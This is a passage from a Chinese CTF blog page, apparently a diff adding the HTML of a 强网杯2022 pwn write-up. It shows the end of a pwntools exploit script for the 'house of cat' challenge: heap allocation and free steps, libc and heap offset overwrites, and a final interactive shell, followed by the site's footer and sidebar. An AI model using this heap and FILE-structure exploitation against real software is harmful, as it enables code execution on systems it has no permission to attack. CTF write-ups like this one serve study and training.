class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x450</span>)</span><br><span class="line"><span class="comment">#edit(4, p64(libcbase + 0x21a0e0) * 2 + p64(0) + p64(heapbase + 0x3160 - 0x20))</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">4</span>, p64(libcbase + <span class="number">0x21a0e0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(heapbase + <span class="number">0x2d00</span> + <span class="number">3</span> - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x468</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208141138524.png"></p>
+<p>成功打出flag</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF2022/" rel="tag"># 强网杯2022</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/23/DSCTF/" rel="prev" title="DSCTF">
+      <i class="fa fa-chevron-left"></i> DSCTF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/09/20/2022%E6%9F%8F%E9%B9%AD%E6%9D%AF-pwn/" rel="next" title="2022柏鹭杯-pwn">
+      2022柏鹭杯-pwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#devnull"><span class="nav-number">2.</span> <span class="nav-text">devnull</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-cat"><span class="nav-number">3.</span> <span class="nav-text">house of cat</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Leof"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Leof</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Leof</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
